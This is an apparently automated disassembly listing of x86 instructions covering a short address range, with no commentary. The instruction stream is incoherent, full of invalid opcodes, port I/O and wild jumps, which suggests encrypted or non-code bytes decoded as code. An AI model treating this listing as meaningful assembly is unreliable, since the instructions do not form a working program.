  4197aa:	lahf   
  4197ab:	int    0x10
  4197ad:	fs fldpi 
  4197b0:	inc    esp
  4197b1:	js     0x419816
  4197b3:	popf   
  4197b4:	push   ecx
  4197b5:	mov    edx,0x971b617b
  4197ba:	ret    0x10f9
  4197bd:	icebp  
  4197be:	inc    edi
  4197bf:	cs popa 
  4197c1:	dec    ecx
  4197c2:	pop    edx
  4197c3:	dec    eax
  4197c4:	jns    0x419757
  4197c6:	inc    edi
  4197c7:	ins    BYTE PTR es:[edi],dx
  4197c8:	or     bl,BYTE PTR [esi+0x1e]
  4197cb:	push   ds
  4197cc:	pop    es
  4197cd:	mov    cl,0xe
  4197cf:	or     dl,bl
  4197d1:	and    BYTE PTR ds:0x2c376454,ch
  4197d7:	inc    edx
  4197d8:	and    eax,0xf7bd2ca6
  4197dd:	lock sub al,BYTE PTR ss:[ebp+0x5e]
  4197e2:	js     0x41979c
  4197e4:	or     eax,0x52be2f3e
  4197e9:	pop    ecx
  4197ea:	jp     0x41982c
  4197ec:	loopne 0x4197f2
  4197ee:	cmp    BYTE PTR [ecx-0x21a0fe40],0x6d
  4197f5:	jmp    0x41978d
  4197f7:	jle    0x4197bf
  4197f9:	push   ecx
  4197fa:	xchg   DWORD PTR [edx+0xc],edi
  4197fd:	mov    dh,0x9
  4197ff:	fwait
  419800:	aas    
  419801:	in     eax,dx
  419802:	out    dx,eax
  419803:	daa    
  419804:	stos   DWORD PTR es:[edi],eax
  419805:	ret    
  419806:	or     ebp,DWORD PTR [eax-0x3aca1fc5]
  41980c:	add    BYTE PTR [eax],bh
  41980e:	ss pushf 
  419810:	out    0x77,eax
  419812:	(bad)  
  419813:	outs   dx,DWORD PTR ds:[esi]
  419814:	cld    
  419815:	popa   
  419816:	pop    esi
  419817:	and    al,0x99
  419819:	jg     0x419805
  41981b:	mov    bh,0x9b
  41981d:	adc    DWORD PTR [esp+edx*1-0x6792da55],ebp
  419824:	dec    esp
  419825:	inc    esi
  419826:	std    
  419827:	mov    bh,0x5e
  419829:	inc    esp
  41982a:	sbb    al,0x92
  41982c:	cmp    BYTE PTR [eax],ch
  41982e:	in     al,dx
  41982f:	jns    0xc7f71972
  419835:	xchg   esi,eax
  419836:	div    eax
  419838:	jo     0x419849
  41983a:	cmp    al,0x37
  41983c:	fmul   DWORD PTR [ebp+0xf]
  41983f:	push   0xffffff81
  419841:	cdq    
  419842:	inc    ebp
  419843:	popf   
  419844:	ds mov dh,0x5b
  419847:	pop    es
  419848:	push   0xd58fd04f
  41984d:	adc    esi,DWORD PTR [eax+0x18]
  419850:	xchg   edx,eax
  419851:	mov    BYTE PTR [eax-0x5839b295],ch
  419857:	lock imul esp,DWORD PTR [edx+0x42e7179a],0xe7eebf3c
  419862:	and    al,0x12
  419864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419865:	test   BYTE PTR [esp+esi*1-0x3fc573ac],dl
  41986c:	mov    edi,0x91abde2f
  419871:	retf   0xe88d
  419874:	out    0xa8,eax
  419876:	call   DWORD PTR [edi-0x33e5e2c4]
  41987c:	mov    al,0x88
  41987e:	pop    edx
  41987f:	jp     0x4198ca
  419881:	inc    ecx
  419882:	jecxz  0x419834
  419884:	in     al,dx
  419885:	sub    BYTE PTR ds:0x49720e2d,0x91
  41988c:	ss push 0xb5607639
  419892:	push   ss
  419893:	mov    al,0xa5
  419895:	xchg   ebp,eax
  419896:	mov    bh,0x9
  419898:	jne    0x419904
  41989a:	push   ecx
  41989b:	pop    ds
  41989c:	push   0x3b
  41989e:	int3   
  41989f:	pop    eax
  4198a0:	(bad)  
  4198a1:	fdivr  st(3),st
  4198a3:	popa   
  4198a4:	pushf  
  4198a5:	js     0x41983a
  4198a7:	mov    eax,0x19bf1a9
  4198ac:	xor    BYTE PTR [eax+ebp*4-0x2d32858d],al
  4198b3:	nop
  4198b4:	inc    edi
  4198b5:	push   0xec60f6c3
  4198ba:	push   esp
  4198bb:	cmp    ebx,ebp
  4198bd:	or     eax,0x664c4878
  4198c2:	sbb    edi,DWORD PTR [esi+0x5a5550e]
  4198c8:	pop    ecx
  4198c9:	pop    ds
  4198ca:	and    cl,BYTE PTR [ebp-0x2d]
  4198cd:	xor    eax,DWORD PTR [ecx]
  4198cf:	mov    ecx,0x2ca92d37
  4198d4:	aas    
  4198d5:	xchg   esp,eax
  4198d6:	or     bh,BYTE PTR [ecx]
  4198d8:	and    eax,edi
  4198da:	scas   al,BYTE PTR es:[edi]
  4198db:	mov    ah,0xed
  4198dd:	or     BYTE PTR [esi+0x24],ah
  4198e0:	jae    0x4198b2
  4198e2:	pop    edi
  4198e3:	aaa    
  4198e4:	retf   
  4198e5:	and    eax,0xf02ccb03
  4198ea:	call   edi
  4198ec:	jmp    0x419880
  4198ee:	es push eax
  4198f0:	pop    eax
  4198f1:	stos   DWORD PTR es:[edi],eax
  4198f2:	mov    ecx,esi
  4198f4:	or     al,BYTE PTR [ecx+0x1f]
  4198f7:	push   edi
  4198f8:	rcr    DWORD PTR [esp+ebp*4+0x71f5df26],cl
  4198ff:	jecxz  0x419909
  419901:	and    ah,bh
  419903:	or     al,0x68
  419905:	sbb    ah,BYTE PTR [ecx-0x6a]
  419908:	leave  
  419909:	xchg   BYTE PTR [edi-0x4c],bh
  41990c:	test   eax,0xae7a8d12
  419911:	popa   
  419912:	jmp    FWORD PTR [ebp+0xd]
  419915:	cmp    eax,0x8e24c115
  41991a:	lods   al,BYTE PTR ds:[esi]
  41991b:	(bad)  
  41991c:	and    edi,DWORD PTR [edx]
  41991e:	push   cs
  41991f:	retf   
  419920:	outs   dx,DWORD PTR ds:[esi]
  419921:	cs jae 0x419930
  419924:	test   edx,esi
  419926:	dec    eax
  419927:	xor    eax,0xfdff20df
  41992c:	sbb    eax,0xc8a3183c
  419931:	pop    esi
  419932:	outs   dx,DWORD PTR ds:[esi]
  419933:	inc    ebx
  419934:	pop    esi
  419935:	shr    DWORD PTR ds:0xf1167c8a,1
  41993b:	cli    
  41993c:	sbb    edx,DWORD PTR [ebx+0x44]
  41993f:	lock stos BYTE PTR es:[edi],al
  419941:	pop    eax
  419942:	xor    edi,DWORD PTR [edi]
  419944:	ds sahf 
  419946:	sub    al,0x78
  419948:	pop    eax
  419949:	xchg   ebp,eax
  41994a:	out    dx,al
  41994b:	pop    ebx
  41994c:	pop    eax
  41994d:	fstp   QWORD PTR [ebx+ebx*8-0x8de5d09]
  419954:	mov    ecx,0x8106b16f
  419959:	jo     0x4198db
  41995b:	xchg   edi,eax
  41995c:	mov    ebx,0x295cc664
  419961:	adc    al,0x1b
  419963:	dec    eax
  419964:	inc    edi
  419965:	scas   al,BYTE PTR es:[edi]
  419966:	outs   dx,BYTE PTR ds:[esi]
  419967:	and    edi,DWORD PTR [ebp-0x2108b6ce]
  41996d:	clc    
  41996e:	xor    ebx,DWORD PTR [edi]
  419970:	shl    cl,1
  419972:	inc    edx
  419973:	mov    eax,ds:0xb423ae3f
  419978:	out    dx,eax
  419979:	lods   eax,DWORD PTR ds:[esi]
  41997a:	jnp    0x4199d8
  41997c:	ja     0x41998a
  41997e:	jecxz  0x41996d
  419980:	mov    bl,0xeb
  419982:	icebp  
  419983:	jne    0x4199f1
  419985:	mov    esp,0xb2640c36
  41998a:	sub    BYTE PTR [ebx-0x1fd0fec7],ah
  419990:	fwait
  419991:	push   esp
  419992:	xor    BYTE PTR [ebx+edx*8-0x3d],al
  419996:	xchg   edx,eax
  419997:	leave  
  419998:	(bad)  
  419999:	lods   al,BYTE PTR ds:[esi]
  41999a:	xor    BYTE PTR [ebp+0x3f],0x5c
  41999e:	inc    esi
  41999f:	and    eax,0xfe35a5b2
  4199a4:	fs lock mov eax,0xff73b9db
  4199ab:	arpl   bx,ax
  4199ad:	das    
  4199ae:	pop    ebp
  4199af:	ror    DWORD PTR [eax-0x35143908],cl
  4199b5:	jmp    FWORD PTR [edi+0xa]
  4199b8:	jmp    0xda5e1178
  4199bd:	jp     0x419957
  4199bf:	adc    eax,0xb345fe2c
  4199c4:	mov    esi,0x54c347e7
  4199c9:	sbb    esp,edi
  4199cb:	xor    edi,DWORD PTR [esi+0x43217564]
  4199d1:	cld    
  4199d2:	shl    esp,cl
  4199d4:	ficomp WORD PTR [edx+0xfea5c4d]
  4199da:	nop
  4199db:	dec    esp
  4199dc:	push   eax
  4199dd:	call   0x42dc2587
  4199e2:	cmp    ah,0x42
  4199e5:	cld    
  4199e6:	and    eax,0xc468e33c
  4199eb:	addr16 je 0x419981
  4199ee:	(bad)  
  4199ef:	push   eax
  4199f0:	(bad)  [eax+0x5d98db0b]
  4199f6:	pmaddwd mm5,mm3
  4199f9:	call   0xbcb782a4
  4199fe:	imul   ebx,eax,0xffffffdf
  419a01:	jns    0x419a24
  419a03:	and    BYTE PTR [ebp-0x5e],dh
  419a06:	mov    ds:0xca8255f1,al
  419a0b:	mov    cl,0x27
  419a0d:	sti    
  419a0e:	outs   dx,DWORD PTR ds:[esi]
  419a0f:	test   al,0x8b
  419a11:	or     esi,DWORD PTR [ecx]
  419a13:	repnz mov ecx,cs
  419a16:	sub    al,0xa7
  419a18:	xor    al,0xe9
  419a1a:	adc    al,0xe0
  419a1c:	arpl   WORD PTR [ecx],bx
  419a1e:	jo     0x419a30
  419a20:	aaa    
  419a21:	push   edx
  419a22:	sub    ebx,ebx
  419a24:	sbb    eax,0x9a291ec4
  419a29:	mov    dh,0x1
  419a2b:	rcr    DWORD PTR [esi-0x1e],cl
  419a2e:	cmp    DWORD PTR [edi-0x6b],edx
  419a31:	in     eax,0xf
  419a33:	(bad)  
  419a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a36:	jae    0x419a7f
  419a38:	xor    eax,0xf3476759
  419a3d:	xor    ebp,eax
  419a3f:	out    0x81,al
  419a41:	push   esp
  419a42:	jnp    0x4199d8
  419a44:	inc    ecx
  419a45:	dec    eax
  419a46:	add    ah,BYTE PTR [ebp-0x69]
  419a49:	icebp  
  419a4a:	popf   
  419a4b:	jno    0x4199d7
  419a4d:	xor    eax,0x1cb43b6c
  419a52:	or     eax,0x4e56915c
  419a57:	xchg   DWORD PTR [edx+0x5c69ecea],edx
  419a5d:	xor    eax,edi
  419a5f:	bound  ebp,QWORD PTR [eax+0x54]
  419a62:	push   ds
  419a63:	sbb    DWORD PTR [edx+0x6424e450],ebp
  419a69:	pushf  
  419a6a:	loope  0x419a72
  419a6c:	dec    eax
  419a6d:	mov    bl,0x61
  419a6f:	mov    edi,0x2bc4f8a4
  419a74:	cdq    
  419a75:	xor    eax,0xded9bd89
  419a7a:	adc    BYTE PTR [ecx+0x26],dl
  419a7d:	xor    al,bl
  419a7f:	bound  eax,QWORD PTR [edx]
  419a81:	ss jmp 0x419aee
  419a84:	icebp  
  419a85:	mov    gs,WORD PTR [edx+esi*8]
  419a88:	and    ebp,DWORD PTR [ecx+esi*1+0x5f]
  419a8c:	(bad)  
  419a8d:	iret   
  419a8e:	mov    dl,0x95
  419a90:	mov    WORD PTR [ebx],fs
  419a92:	clc    
  419a93:	addr16 loop 0x419aff
  419a96:	dec    eax
  419a97:	and    al,ch
  419a99:	dec    esp
  419a9a:	ins    BYTE PTR es:[edi],dx
  419a9b:	add    BYTE PTR [esi+0x73],ah
  419a9e:	pushf  
  419a9f:	in     al,0x88
  419aa1:	xor    bh,ah
  419aa3:	sti    
  419aa4:	mov    ss,WORD PTR [edi-0x1611c12a]
  419aaa:	pop    es
  419aab:	or     BYTE PTR [ecx-0x22],0x6f
  419aaf:	mov    eax,ds:0x316f9bb2
  419ab4:	rol    DWORD PTR [eax+0x31],cl
  419ab7:	test   al,0x20
  419ab9:	jae    0x419af7
  419abb:	ss jge 0x419a72
  419abe:	pusha  
  419abf:	add    BYTE PTR [ecx+0x4e],dh
  419ac2:	jle    0x419aac
  419ac4:	ins    DWORD PTR es:[edi],dx
  419ac5:	jge    0x419b23
  419ac7:	and    esi,esi
  419ac9:	or     al,0x79
  419acb:	(bad)  
  419acc:	mov    eax,0x69e2f6ba
  419ad1:	fsubr  DWORD PTR [eax-0x68]
  419ad4:	sbb    ebx,DWORD PTR [ebp-0x2e53397a]
  419ada:	pop    ebx
  419adb:	mov    ah,0xa4
  419add:	dec    esp
  419ade:	jecxz  0x419a6a
  419ae0:	push   0xffffff9e
  419ae2:	retf   0xc2e8
  419ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ae6:	jb     0x419aad
  419ae8:	cmp    al,0x1d
  419aea:	xor    dh,ah
  419aec:	into   
  419aed:	scas   al,BYTE PTR es:[edi]
  419aee:	jo     0x419b57
  419af0:	adc    eax,0x89952812
  419af5:	sbb    esp,DWORD PTR [esi+0x126f43f6]
  419afb:	jne    0x419b30
  419afd:	lahf   
  419afe:	gs pop ds
  419b00:	inc    edx
  419b01:	inc    esi
  419b02:	out    0x2c,eax
  419b04:	and    al,0x8e
  419b06:	pop    ebx
  419b07:	stos   BYTE PTR es:[edi],al
  419b08:	div    BYTE PTR ds:0x12645a35
  419b0e:	mov    ch,0x67
  419b10:	dec    ebp
  419b11:	xlat   BYTE PTR ds:[ebx]
  419b12:	mov    dl,0x9e
  419b14:	popa   
  419b15:	jge    0x419b44
  419b17:	mov    bh,ch
  419b19:	sbb    ch,cl
  419b1b:	into   
  419b1c:	imul   edx,DWORD PTR [ebx+0x3e],0x2007d022
  419b23:	cdq    
  419b24:	inc    eax
  419b25:	cld    
  419b26:	mov    ah,0x27
  419b28:	sub    al,0xc7
  419b2a:	test   al,0xed
  419b2c:	neg    DWORD PTR [edx-0x371dbe3b]
  419b32:	jmp    0x419ad0
  419b34:	mov    dl,0x66
  419b36:	inc    ecx
  419b37:	xchg   ebx,eax
  419b38:	rcl    DWORD PTR [ebx],1
  419b3a:	lods   eax,DWORD PTR ds:[esi]
  419b3b:	enter  0xcf24,0x15
  419b3f:	aam    0x90
  419b41:	or     DWORD PTR [ecx+0x9d29b68],eax
  419b47:	or     esp,ebx
  419b49:	fsub   DWORD PTR [edi+0x32]
  419b4c:	adc    dh,BYTE PTR [ecx+edi*1-0x7934e373]
  419b53:	(bad)  
  419b54:	mov    esi,0x90e37b0c
  419b59:	mov    al,0x22
  419b5b:	outs   dx,DWORD PTR ds:[esi]
  419b5c:	outs   dx,DWORD PTR ds:[esi]
  419b5d:	or     al,0x9f
  419b5f:	add    dl,BYTE PTR [edx-0x6a21b4dd]
  419b65:	inc    ebp
  419b66:	ror    DWORD PTR [edi-0x7fa34573],cl
  419b6c:	adc    al,0x54
  419b6e:	pushf  
  419b6f:	stos   DWORD PTR es:[edi],eax
  419b70:	pop    esp
  419b71:	fstp   DWORD PTR [edi-0x6a2b7c3e]
  419b77:	jg     0x419b5c
  419b79:	or     eax,0xe7fef0c2
  419b7e:	pop    esi
  419b7f:	dec    ebx
  419b80:	imul   ebx,DWORD PTR [esi-0x4672fc57],0xffffffb7
  419b87:	pop    ebx
  419b88:	pop    eax
  419b89:	cmp    BYTE PTR [ecx-0x3a],dh
  419b8c:	add    al,BYTE PTR [esi]
  419b8e:	aas    
  419b8f:	and    al,0x8e
  419b91:	xchg   edi,eax
  419b92:	mov    ebp,0xdb5ec2f7
  419b97:	xchg   edx,eax
  419b98:	mov    esp,0xcfeeb9cf
  419b9d:	inc    ebp
  419b9e:	xor    dh,bl
  419ba0:	das    
  419ba1:	or     BYTE PTR [edx],ch
  419ba3:	imul   edx,DWORD PTR [edx+0x29d28f7d],0xffffffa9
  419baa:	rcl    BYTE PTR [ecx],0x3f
  419bad:	adc    BYTE PTR [esi+0x7915dfa0],dl
  419bb3:	add    eax,0xa805471
  419bb8:	lock jnp 0x419b49
  419bbb:	cmc    
  419bbc:	xor    edi,DWORD PTR [eax-0x71]
  419bbf:	ins    BYTE PTR es:[edi],dx
  419bc0:	adc    al,0x4c
  419bc2:	xor    edx,esi
  419bc4:	mov    ds:0xbff78ad0,eax
  419bc9:	mov    ds,WORD PTR [ebp-0x9ab45c1]
  419bcf:	aam    0x37
  419bd1:	retf   0xded6
  419bd4:	add    BYTE PTR [esi-0x3d],al
  419bd7:	fwait
  419bd8:	pushf  
  419bd9:	dec    edi
  419bda:	mov    ds:0x684ec5ff,eax
  419bdf:	ins    BYTE PTR es:[edi],dx
  419be0:	pop    DWORD PTR [eax]
  419be2:	outs   dx,BYTE PTR ds:[esi]
  419be3:	inc    esp
  419be4:	leave  
  419be5:	xchg   edi,eax
  419be6:	xchg   esp,eax
  419be7:	(bad)  
  419be8:	adc    cl,0xde
  419beb:	mov    edi,DWORD PTR [edi-0x58fc6545]
  419bf1:	jnp    0x419c6b
  419bf3:	sbb    DWORD PTR [esi-0x1f28ff71],edi
  419bf9:	fadd   st,st(1)
  419bfb:	pusha  
  419bfc:	mov    ecx,0x80cc6eed
  419c01:	sub    eax,0x85f3dc0e
  419c06:	pop    ss
  419c07:	test   cl,cl
  419c09:	cwde   
  419c0a:	cdq    
  419c0b:	or     ebp,DWORD PTR [edx-0x5e8780aa]
  419c11:	adc    bh,BYTE PTR [ebx+0x5b]
  419c14:	repnz inc edx
  419c16:	jmp    0xb801:0x7ea52055
  419c1d:	fld    TBYTE PTR [esi+edi*4]
  419c20:	push   esp
  419c21:	call   0x51d7:0xc3ac7d15
  419c28:	cmp    ecx,DWORD PTR [eax+0x446a0c55]
  419c2e:	addr16 popf 
  419c30:	(bad)  
  419c31:	retf   0x429
  419c34:	pop    eax
  419c35:	xchg   BYTE PTR [edi+0x4bf199bb],bh
  419c3b:	pop    esp
  419c3c:	inc    ebx
  419c3d:	rol    DWORD PTR [esi+0x23],1
  419c40:	leave  
  419c41:	or     DWORD PTR [ecx+0x52da1f53],eax
  419c47:	sbb    BYTE PTR [ebp-0x14feec7f],0x90
  419c4e:	pop    esp
  419c4f:	data16 outs dx,BYTE PTR ds:[esi]
  419c51:	xchg   edx,eax
  419c52:	xchg   ebx,eax
  419c53:	xor    edx,DWORD PTR [edi-0xde0fe78]
  419c59:	sbb    DWORD PTR [ebp+0x53],ecx
  419c5c:	call   0xe8ae44be
  419c61:	xor    eax,0xda9a7aa
  419c66:	ins    BYTE PTR es:[edi],dx
  419c67:	mov    al,ds:0x5cc951f6
  419c6c:	loope  0x419c41
  419c6e:	test   BYTE PTR [ebp+0x5bd88192],ch
  419c74:	out    0x9a,eax
  419c76:	js     0x419c66
  419c78:	or     ah,BYTE PTR [ebx-0x22]
  419c7b:	daa    
  419c7c:	out    dx,eax
  419c7d:	xchg   ecx,eax
  419c7e:	popf   
  419c7f:	das    
  419c80:	and    DWORD PTR [ecx-0x7],ecx
  419c83:	sbb    eax,0x961f32bc
  419c88:	mov    edx,0x58117c4b
  419c8d:	daa    
  419c8e:	imul   esi,DWORD PTR [ecx],0xffffffbe
  419c91:	sti    
  419c92:	xor    ch,ah
  419c94:	scas   al,BYTE PTR es:[edi]
  419c95:	mov    DWORD PTR [edi],esi
  419c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c98:	je     0x419c77
  419c9a:	pop    esp
  419c9b:	ret    0x69bb
  419c9e:	xchg   dh,ch
  419ca0:	arpl   bx,bx
  419ca2:	sbb    ebp,edx
  419ca4:	ins    BYTE PTR es:[edi],dx
  419ca5:	mov    WORD PTR [ecx-0x2b093cd8],?
  419cab:	jnp    0x419cbb
  419cad:	mov    al,0x71
  419caf:	loop   0x419cc8
  419cb1:	push   0xffffffe0
  419cb3:	ds hlt 
  419cb5:	scas   al,BYTE PTR es:[edi]
  419cb6:	nop
  419cb7:	mov    BYTE PTR [ecx-0x49],dh
  419cba:	xchg   esi,eax
  419cbb:	in     eax,0x33
  419cbd:	sti    
  419cbe:	(bad)  
  419cbf:	dec    DWORD PTR [ebx+ecx*8]
  419cc2:	scas   eax,DWORD PTR es:[edi]
  419cc3:	or     ah,BYTE PTR [esi]
  419cc5:	add    BYTE PTR [esi-0xbdfa418],dl
  419ccb:	push   cs
  419ccc:	inc    ebx
  419ccd:	test   al,0x6a
  419ccf:	lods   eax,DWORD PTR ds:[esi]
  419cd0:	leave  
  419cd1:	inc    esp
  419cd2:	adc    edi,DWORD PTR [esi]
  419cd4:	mov    dh,0x68
  419cd6:	pop    es
  419cd7:	retf   
  419cd8:	ror    DWORD PTR [eax+ecx*2-0x77],cl
  419cdc:	xor    al,bl
  419cde:	fadd   DWORD PTR [eax]
  419ce0:	gs mov ebx,0xfcca6035
  419ce6:	inc    esi
  419ce7:	jbe    0x419cd5
  419ce9:	xchg   ebp,eax
  419cea:	xchg   ebp,eax
  419ceb:	mov    ah,0xd1
  419ced:	dec    esp
  419cee:	xor    edx,DWORD PTR [ecx-0x2]
  419cf1:	or     dl,BYTE PTR [eax+0x47685dac]
  419cf7:	pop    ecx
  419cf8:	jge    0x419d78
  419cfa:	dec    esp
  419cfb:	scas   al,BYTE PTR es:[edi]
  419cfc:	mov    edx,0x61a94bc0
  419d01:	jns    0x419d2c
  419d03:	mov    eax,0x59e80b26
  419d08:	cs jmp 0x419d64
  419d0b:	inc    esi
  419d0c:	js     0x419d89
  419d0e:	jle    0x419d1a
  419d10:	xor    dl,BYTE PTR [ebp-0x32]
  419d13:	sbb    al,0x69
  419d15:	xchg   bl,dl
  419d17:	cld    
  419d18:	repz call FWORD PTR [edx]
  419d1b:	iret   
  419d1c:	jecxz  0x419c9e
  419d1e:	sbb    al,0xed
  419d20:	push   ss
  419d21:	push   cs
  419d22:	sub    ah,0xc6
  419d25:	test   DWORD PTR [ebx],esi
  419d27:	mov    eax,ds:0x9480aa3b
  419d2c:	or     al,0xb5
  419d2e:	gs fadd st(6),st
  419d31:	mov    ss,WORD PTR [ecx+eax*4-0x72]
  419d35:	ds inc ebp
  419d37:	clc    
  419d38:	xor    BYTE PTR [eax-0xc],bl
  419d3b:	add    dl,BYTE PTR [ecx]
  419d3d:	rcl    BYTE PTR [ebx+0x35ecb930],0x19
  419d44:	rcr    DWORD PTR [esi+esi*8],cl
  419d47:	and    edx,DWORD PTR [edi-0x7ce40d96]
  419d4d:	jge    0x419d1d
  419d4f:	fcomp  QWORD PTR [edx-0x37]
  419d52:	(bad)  
  419d53:	fnstsw WORD PTR [ebx+eax*8-0x4955bda9]
  419d5a:	lahf   
  419d5b:	popf   
  419d5c:	ret    
  419d5d:	cmp    al,0xfa
  419d5f:	jnp    0x419d39
  419d61:	out    dx,eax
  419d62:	mov    edi,0xc76dee25
  419d67:	cmp    ebx,esi
  419d69:	test   DWORD PTR [ebx],0x3f96c9cf
  419d6f:	pop    ds
  419d70:	dec    esp
  419d71:	shl    DWORD PTR [eax-0x2999998e],0x4a
  419d78:	jmp    0x89a0a2f3
  419d7d:	mov    bh,BYTE PTR [eax]
  419d7f:	in     al,0xab
  419d81:	mov    ch,0xa9
  419d83:	push   esi
  419d84:	pop    ss
  419d85:	inc    esi
  419d86:	nop
  419d87:	jo     0x419d27
  419d89:	outs   dx,BYTE PTR ds:[esi]
  419d8a:	inc    ecx
  419d8b:	jae    0x419de3
  419d8d:	cld    
  419d8e:	in     eax,dx
  419d8f:	inc    edx
  419d90:	push   eax
  419d91:	and    eax,0x87f67be6
  419d96:	jne    0x419dc9
  419d98:	jo     0x419dd4
  419d9a:	mov    ds:0xccdb837f,al
  419d9f:	fdiv   QWORD PTR [ecx-0x3051c5ec]
  419da5:	scas   eax,DWORD PTR es:[edi]
  419da6:	xchg   edi,eax
  419da7:	sti    
  419da8:	outs   dx,DWORD PTR ds:[esi]
  419da9:	mov    al,BYTE PTR [ebx+esi*2-0x1f]
  419dad:	(bad)  
  419dae:	push   es
  419daf:	and    DWORD PTR [edi+0x381708d7],esi
  419db5:	aam    0xa2
  419db7:	iret   
  419db8:	hlt    
  419db9:	pop    edx
  419dba:	xor    BYTE PTR [edx+esi*1+0x26ef03be],ah
  419dc1:	icebp  
  419dc2:	sub    BYTE PTR [ebp-0x6c],0x0
  419dc6:	in     eax,0xd8
  419dc8:	xchg   esp,eax
  419dc9:	inc    ebp
  419dca:	adc    edx,0x1dab42c8
  419dd0:	popf   
  419dd1:	add    dh,BYTE PTR [ecx+0x6af745fc]
  419dd7:	add    cl,BYTE PTR [ebx]
  419dd9:	popa   
  419dda:	xor    esp,0x1
  419ddd:	test   edi,edi
  419ddf:	sub    DWORD PTR [si-0x21f3],0x3f
  419de5:	sahf   
  419de6:	mov    ebx,DWORD PTR [esi]
  419de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de9:	xchg   DWORD PTR [edx+0x3],esp
  419dec:	jns    0x419e29
  419dee:	cmp    BYTE PTR [esi+0x4d],dl
  419df1:	push   esi
  419df2:	sbb    eax,0x646d968e
  419df7:	(bad)  
  419df8:	adc    ecx,DWORD PTR [edx-0x5c91904d]
  419dfe:	dec    ecx
  419dff:	and    al,0xfc
  419e01:	ret    
  419e02:	add    esi,DWORD PTR [edx+0x56]
  419e05:	scas   al,BYTE PTR es:[edi]
  419e06:	addr16 (bad) 
  419e08:	xor    ah,bl
  419e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e0b:	(bad)  
  419e0c:	ins    BYTE PTR es:[edi],dx
  419e0d:	add    eax,0xa73c0375
  419e12:	pop    eax
  419e13:	dec    eax
  419e14:	(bad)  
  419e16:	and    DWORD PTR [ebx+esi*2],eax
  419e19:	push   ds
  419e1a:	sti    
  419e1b:	xchg   edx,eax
  419e1c:	xor    ch,al
  419e1e:	(bad)  [edi*2+0x86c7c4]
  419e25:	cmp    dl,ah
  419e27:	fld    DWORD PTR [si-0x29]
  419e2b:	addr16 nop
  419e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e2e:	icebp  
  419e2f:	push   ds
  419e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e31:	xchg   ecx,eax
  419e32:	inc    esi
  419e33:	sub    eax,0x74222fb8
  419e38:	mov    ah,0xec
  419e3a:	pop    edx
  419e3b:	add    eax,0xf85c92e2
  419e40:	inc    ebp
  419e41:	ja     0x419e0a
  419e43:	(bad)  
  419e44:	in     eax,dx
  419e45:	frstor [ebp+0x6c]
  419e48:	cmp    esp,DWORD PTR [edi+0x4fc33e48]
  419e4e:	sub    edi,edx
  419e50:	pop    eax
  419e51:	xchg   esp,eax
  419e52:	into   
  419e53:	add    eax,0xefaa6ccd
  419e58:	addr16 pushf 
  419e5a:	imul   ecx,DWORD PTR [eax+0x5f],0x40
  419e5e:	(bad)  
  419e5f:	retf   
  419e60:	mov    eax,0xef438d5
  419e65:	inc    ebx
  419e66:	aaa    
  419e67:	lods   al,BYTE PTR ds:[esi]
  419e68:	ins    DWORD PTR es:[edi],dx
  419e69:	jno    0x419e76
  419e6b:	cmp    esi,esi
  419e6d:	loope  0x419e26
  419e6f:	and    ebx,DWORD PTR [esi-0x1cca3c1d]
  419e75:	pop    es
  419e76:	pop    ss
  419e77:	imul   esi,DWORD PTR [ecx],0x6cb6a8e5
  419e7d:	sbb    eax,0x47be52cd
  419e82:	js     0x419e9a
  419e84:	in     al,dx
  419e85:	and    BYTE PTR [ebx-0x3f6cbb9b],ah
  419e8b:	add    al,0x42
  419e8d:	cmp    ch,cl
  419e8f:	add    eax,0x4f36bee9
  419e94:	(bad)  
  419e95:	pop    esi
  419e96:	ret    
  419e97:	add    dh,BYTE PTR [ecx]
  419e99:	mov    dh,0x6b
  419e9b:	sub    DWORD PTR [ecx-0x2b201c1c],0xf97fbfe7
  419ea5:	jecxz  0x419e70
  419ea7:	mov    ds:0x4d2b37e9,al
  419eac:	shr    BYTE PTR [esp+edx*1],1
  419eaf:	or     al,0x63
  419eb1:	sub    BYTE PTR [ecx],bl
  419eb3:	jmp    0x419ef5
  419eb5:	pop    ds
  419eb6:	aad    0xd
  419eb8:	mov    cl,0x61
  419eba:	adc    ebx,DWORD PTR [ebx+0x72]
  419ebd:	xchg   ebx,eax
  419ebe:	mov    bh,0x9d
  419ec0:	cwde   
  419ec1:	shl    esp,0xf3
  419ec4:	ftst   
  419ec6:	(bad)
  419ecb:	lods   al,BYTE PTR ds:[esi]
  419ecc:	dec    ecx
  419ecd:	imul   eax,DWORD PTR [edi+edi*8-0x4a02caf5],0x1f0c0241
  419ed8:	into   
  419ed9:	js     0x419eea
  419edb:	adc    al,0x27
  419edd:	inc    eax
  419ede:	cli    
  419edf:	add    DWORD PTR [esi],0xe754b4ad
  419ee5:	and    eax,0xb24dfd1b
  419eea:	addr16 jae 0x419eaf
  419eed:	lds    edx,FWORD PTR [edx+ebp*4]
  419ef0:	inc    ebp
  419ef1:	mov    bl,0x68
  419ef3:	jnp    0x419eae
  419ef5:	out    0x41,eax
  419ef7:	in     eax,dx
  419ef8:	cli    
  419ef9:	pusha  
  419efa:	mov    al,0x34
  419efc:	(bad)  
  419efd:	(bad)  
  419eff:	in     al,0xb7
  419f01:	xchg   edi,eax
  419f02:	adc    al,BYTE PTR [esi-0x7ef8dd91]
  419f08:	mov    ah,0x51
  419f0a:	(bad)  
  419f0b:	and    eax,DWORD PTR [esi-0x59fe661f]
  419f11:	out    0x7d,al
  419f13:	xor    ecx,DWORD PTR [edi+eiz*8-0x30]
  419f17:	push   esi
  419f18:	adc    DWORD PTR [ecx],ecx
  419f1a:	fcmovb st,st(7)
  419f1c:	xorps  xmm2,xmm0
  419f1f:	sti    
  419f20:	div    BYTE PTR [ebp+0x2438ab9d]
  419f26:	jg     0x419f06
  419f28:	mov    ah,0x49
  419f2a:	xchg   edx,eax
  419f2b:	adc    DWORD PTR [ebx+0x4e],ecx
  419f2e:	push   esi
  419f2f:	add    esi,ebp
  419f31:	sar    DWORD PTR [edi+0x60],cl
  419f34:	mov    esi,0x5fb66533
  419f39:	sbb    al,0x6a
  419f3b:	dec    ecx
